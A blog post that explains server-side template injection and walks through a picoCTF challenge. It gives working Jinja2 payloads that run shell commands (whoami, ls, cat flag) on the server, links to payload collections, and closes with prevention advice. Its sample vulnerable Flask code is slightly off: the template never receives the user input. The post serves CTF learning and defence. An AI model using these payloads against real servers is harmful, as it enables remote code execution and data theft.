---
title: "Server-Side Template Injection (SSTI) — Explained Simply"
date: 2025-04-17T12:20:30-05:30
categories:
  - blog
tags:
  - SSTI
  - PicoCTF
  - Learning
---
>Quick and hands-on walkthrough of an SSTI (Server-Side Template Injection) vulnerability using a PicoCTF challenge. No boring theory dumps — just straight to the point with payloads, screenshots, and flag hunting. If you're into web exploitation or just starting out with CTFs, this one's for you.

---

>### What’s SSTI?
Server-Side Template Injection (SSTI) is a vulnerability that pops up when user input gets directly embedded into a server-side template engine without proper checks. If this happens, an attacker can inject their own code and get it executed on the server — leading to serious stuff like remote code execution (RCE), data leaks, or even full access to the system.

---

>### How Does SSTI Happen?
Web frameworks often use template engines to generate dynamic HTML pages. These templates can include variables like {% raw %}
{{ user }}
{% endraw %}, which the engine replaces with actual values. Common engines are:
- **Jinja2 (Python/Flask)**
- **Twig (PHP)**
- **Freemarker (Java)**
- **Pug (Node.js)**

>Now, if a developer takes raw user input and sticks it straight into a template without escaping or validating it, it’s game over.
Example with Flask + Jinja2:

```
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/")
def index():
    user_input = request.args.get("name", "Guest")
    return render_template_string("Hello {{ user_input }}")

```

>If someone sends {% raw %}`{{7*7}}` {% endraw %} as input, the output will be:
`Hello 49`
So yeah, the server actually _runs_ that code instead of just showing it as plain text. That’s the whole issue.

---

>### Why Does SSTI Even Exist?
It mostly boils down to:
1. Template engines are designed to _evaluate_ stuff like 
{% raw %}`{{ something }}`{% endraw %}.
2. If user input ends up there unchecked, it gets interpreted.
3. Developers often don’t realize how powerful (and risky) these engines are.
If attackers find a way in, they can run serious payloads. Like this one in Jinja2:

```
{% raw %} {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }} {% endraw %}
```

>This runs the `whoami` command on the server. Yep, it’s that dangerous.

---

>### SSTI in Action (PicoCTF Challenge)
Let’s take a quick hands-on look at SSTI using a beginner-friendly challenge from PicoCTF — because honestly, too much theory sucks. Here's the link to the challenge:

>[picoCTF - picoGym Challenges](https://play.picoctf.org/practice/challenge/492)

>So the setup is simple — there’s a website that just displays whatever you type in a textbox. Like this:
![Text Box UI](/assets/images/SSTI-vulnerability/TextboxUI.png)

>If I type `hello`, it shows… well, `hello`. Nothing fancy.
![Hello Input](/assets/images/SSTI-vulnerability/Hello_Input.png)
![Hello Output](/assets/images/SSTI-vulnerability/Hello_Output.png)

>Now, let’s toss in a classic SSTI payload and see what happens. Try this:
{% raw %} `{{7*7}}` {% endraw %}

>If the site is vulnerable, the template engine will evaluate`7*7` and show `49` instead of just printing the curly braces.

>![SSTI Payload Input](/assets/images/SSTI-vulnerability/SSTI_Payload_Input.png)
![Output is 49](/assets/images/SSTI-vulnerability/Output_is_49.png)

>That confirms it — SSTI confirmed

>### Getting the Flag
Now we know it’s vulnerable, let’s try to poke around and get that flag.
We’ll use this payload to list files in the server directory:

{% raw %}
```
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
{% endraw %}

Output:
```
__pycache__ app.py flag requirements.txt
```
There it is! We found the `flag` file.

Let’s read it:

{% raw %}
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```
{% endraw %}

And just like that, the flag is ours.

---

>### Note:
Not all SSTI challenges will be this straightforward. Sometimes, input sanitization or filters might block basic payloads, so you’ll need to get creative with your bypass techniques.

---

>### Some Useful Payload Lists:
- [SSTI Payload Collection – PayloadBox](https://github.com/payloadbox/ssti-payloads/blob/master/README.md)
- [SSTImap – Fuzz SSTI Payloads](https://github.com/vladko312/SSTImap.git)

---
>### How to Prevent SSTI
Here’s what you should do to stay safe:
1. **Don’t use `render_template_string()` with user input**  
    – Stick to `render_template()` with proper, pre-written templates.   
2. **Escape and sanitize input**  
    – Use filters like {% raw %}`{{ user_input | e }}` {% endraw %}to prevent it from being interpreted.  
3. **Limit what the template engine can do**  
    – In Jinja2, go for sandboxing to block dangerous functions.
4. **Use allowlists**  
    – Only allow expected values. Don’t blindly trust user input.
5. **Add a WAF (Web Application Firewall)**  
    – It can help block suspicious inputs and common attack patterns.


---

>### Wrapping Up
SSTI isn’t just a cool bug — it can fully compromise a system. Knowing how these template engines work and locking down any input that ends up in them is key. Always validate, escape, and play it safe when rendering templates. One careless mistake can lead to a full-blown server takeover.